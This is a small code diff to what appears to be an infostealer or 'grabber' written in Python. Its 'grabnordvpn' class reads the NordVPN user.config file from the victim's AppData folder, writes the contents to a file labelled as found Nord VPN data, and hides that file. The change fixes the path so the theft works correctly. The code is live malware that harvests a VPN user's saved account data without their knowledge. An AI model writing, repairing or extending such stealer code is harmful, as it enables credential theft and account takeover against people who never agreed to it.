@@ -1,6 +1,5 @@
 import os
 import platform
-from tempfile import mkdtemp
 import difflib
 import threading
 import uuid
@@ -515,7 +514,7 @@ class grabnordvpn():
                 f.write("https://github.com/Smug246 | Nord VPN Data\n\n")
                 f.write("Nord Vpn Data Found:\n")
 
-                nord_path = open((self.appdata + "\\NordVPN\\NordVPN.exe_Path_NordVPN.exe_Path_ocgnpsstpzc4lj3yc2lnr1cf1hyyhdd5\\6.35.9.0\\user.config")).read()
+                nord_path = open((self.appdata + "\\NordVPN\\NordVPN.exe_Path_ocgnpsstpzc4lj3yc2lnr1cf1hyyhdd5\\6.35.9.0\\user.config")).read()
                 f.write(nord_path)
                 hide(".\\nordvpn-data.txt")
         except Exception as e:
